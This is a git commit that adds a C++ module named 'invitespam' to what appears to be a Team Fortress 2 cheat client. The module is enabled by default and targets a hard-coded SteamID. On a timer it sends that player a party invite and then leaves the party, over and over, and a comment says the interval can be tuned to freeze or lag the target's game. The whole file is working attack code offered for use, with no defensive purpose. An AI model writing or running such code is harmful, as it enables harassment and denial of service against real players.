29c97b7d13b48248a896b323e6cef92c5162686a
abuaba123 <aarlumine@gmail.com>
2024-06-04 23:21:16 +0300

    up

---
+++ src/hacks/invitespam.cpp
@@ -0,0 +1,26 @@
+#include "common.hpp"
+
+namespace hacks::invitespam
+{
+
+static settings::Boolean enabled("invitespam.enable", "true");
+static settings::Int steamid("invitespam.target", "1257342210");
+static settings::Int invtime{ "invitespam.invtime", "40" }; // Adjust this if you want to freeze or lag someone's game.
+
+static Timer invtimer{};
+static void Paint()
+{
+    if (!enabled)
+        return;
+    if (invtimer.test_and_set(*invtime))
+    {
+        g_IEngine->ClientCmd_Unrestricted(strfmt("tf_party_invite_user %i", *steamid).get());
+        g_IEngine->ClientCmd_Unrestricted("tf_party_leave");
+    }
+}
+
+static InitRoutine init([]() {
+    EC::Register(EC::Paint, Paint, "paint_invitespam");
+});
+
+} // namespace hacks::invitespam
